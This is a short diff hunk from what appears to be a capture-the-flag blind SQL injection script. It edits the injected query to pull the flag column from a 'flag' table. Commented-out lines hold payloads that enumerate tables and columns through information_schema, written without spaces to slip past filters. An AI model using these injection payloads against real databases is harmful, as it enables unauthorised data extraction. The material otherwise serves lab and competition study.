@@ -192,7 +192,7 @@ visited = int(regex.findall(body)[0])
 
 #q = "(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))"
 #q = "(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag'))"
-q = "(select(????)from(flag))"
+q = "(select(flag)from(flag))"
 
 out = ""
 for i in range(1,30):
